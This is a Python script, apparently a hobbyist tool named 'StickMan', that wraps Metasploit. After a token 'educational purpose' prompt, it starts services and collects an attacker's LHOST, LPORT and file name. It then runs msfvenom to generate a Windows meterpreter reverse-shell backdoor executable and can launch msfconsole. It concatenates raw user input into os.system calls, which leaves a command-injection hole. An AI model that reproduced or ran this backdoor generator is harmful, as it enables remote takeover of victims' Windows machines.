import time
import random
import os
print ("""



           ____  _____  _  ____  _  __   _      ____  _
          / ___\/__ __\/ \/   _\/ |/ /  / \__/|/  _ \/ \  /|
          |    \  / \  | ||  /  |   /   | |\/||| / \|| |\ ||
          \___ |  | |  | ||  \_ |   \   | |  ||| |-||| | \||
          \____/  \_/  \_/\____/\_|\_\  \_/  \|\_/ \|\_/  \|

Tool Coded By @Nikhil      Insta:- https://www/instagram.com/iamnikhil2459

""")

choice = input("Will You use this tool for Educational Purpose:")
if choice == 'y':
   print("Now You Can use this tool")

elif choice == 'Y':
     print("Now You Can us this Tool")

else:
   exit()

print ("Starting Apache2 Service")
os.system("service apache2 start")
time.sleep(1)
print("Service Apache2 Started ")
time.sleep(1)
print ("Starting Postgresql Service")
os.system("service postgresql start")
time.sleep(1)
print ("All Services Started Succesfully")
time.sleep(1)
os.system("clear")

print ("""



           ____  _____  _  ____  _  __   _      ____  _
          / ___\/__ __\/ \/   _\/ |/ /  / \__/|/  _ \/ \  /|
          |    \  / \  | ||  /  |   /   | |\/||| / \|| |\ ||
          \___ |  | |  | ||  \_ |   \   | |  ||| |-||| | \||
          \____/  \_/  \_/\____/\_|\_\  \_/  \|\_/ \|\_/  \|

Tool Coded By @Nikhil      Insta:- https://www/instagram.com/iamnikhil2459

""")

print("""

1.Create Backdoor For Windows [tcp,https,tcp_dns]
2.Jump To Msfconsole
3.Exit

""")

payload_type = input("StickMan==>")
if payload_type == 'tcp':
   print (" [+] Payload TYPE : "+payload_type)

elif payload_type == 'https':
    print (" [+] Payload TYPE : "+payload_type)

elif payload_type == 'tcp_dns':
   print (" [+] Payload TYPE : "+payload_type)

elif payload_type == '2':
    print("StickMan Will Be Closed After You Close Msfconsole")

    os.system("xterm -fa monaco -fs 13 -bg black -e 'msfconsole' ")
    exit()

elif payload_type == '3':
    print("Stopping All services")
    os.system("service apache2 stop && service postgresql stop")
    os.system("clear")
    print("Thanks For Using StickMan   :)   Hacker India")
    exit()

lhost=input("StickMan==>[LHOST]")
print ("[+] LHOST for Payload  : "+lhost)

lport =input("StickMan==>[LPORT]")
print ("[+] LPORT for Payload : "+lport)

NAME =input("StickMan==>[Name]")
print ("[+] NAME for Payload : "+NAME)

raw_payload ='msfvenom -p windows/meterpreter/reverse_'+payload_type+' LHOST='+ lhost +' LPORT='+ lport +' -f exe > '+ NAME +'.exe'

print ("[✔] Checking directories...")
if not os.path.isdir("./result"):
    os.mkdir("./result")
    print ("[+] Creating [output Directory]")
os.system(raw_payload)
os.system("clear")

print("""  ____  _____  _  ____  _  __   _      ____  _
          / ___\/__ __\/ \/   _\/ |/ /  / \__/|/  _ \/ \  /|
          |    \  / \  | ||  /  |   /   | |\/||| / \|| |\ ||
          \___ |  | |  | ||  \_ |   \   | |  ||| |-||| | \||
          \____/  \_/  \_/\____/\_|\_\  \_/  \|\_/ \|\_/  \|

Tool Coded By @Nikhil      Insta:- https://www/instagram.com/iamnikhil2459
""")

print("""

1.Jump To Msfconsole
2.Exit

""")

lol = input("StickMan==>")

if lol == '1':
   os.system("xterm -fa monaco -fs 13 -bg black -e 'msfconsole' ")

elif lol == '2':
     print("Stopping All services")
     os.system("service apache2 stop && service postgresql stop")
     os.system("clear")
     print("Thanks For Using StickMan   :)   Hacker India")
     exit()

else:
    exit()